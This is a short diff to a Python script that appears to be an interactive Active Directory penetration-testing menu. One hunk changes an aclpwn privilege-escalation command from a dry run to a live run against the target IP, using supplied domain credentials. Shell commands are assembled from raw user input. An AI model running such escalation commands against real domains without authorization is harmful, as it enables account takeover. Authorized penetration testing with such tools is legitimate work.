@@ -1101,7 +1101,7 @@ while True:
       else:
          DOM = spacePadding(DOM, COL1)
          if DOMC == 1:
-            print("[+] Removing previous domain name " + BAK + " from /etc/hosts...")
+            print("[+] Removing previous domain name " + BAK.rstrip(" ") + " from /etc/hosts...")
             command("sed -i '$d' /etc/hosts")
             
          if DOM[:5] != "EMPTY":
@@ -2412,7 +2412,7 @@ while True:
          BH2 = input("[+] Enter Neo4j password: ")
          
          if BH1 != "" and BH2 != "":
-            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s -dry")
+            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") + "' -s " + TIP.rstrip(" "))
          else:
             print("[+] Username or password cannot be null...")
             
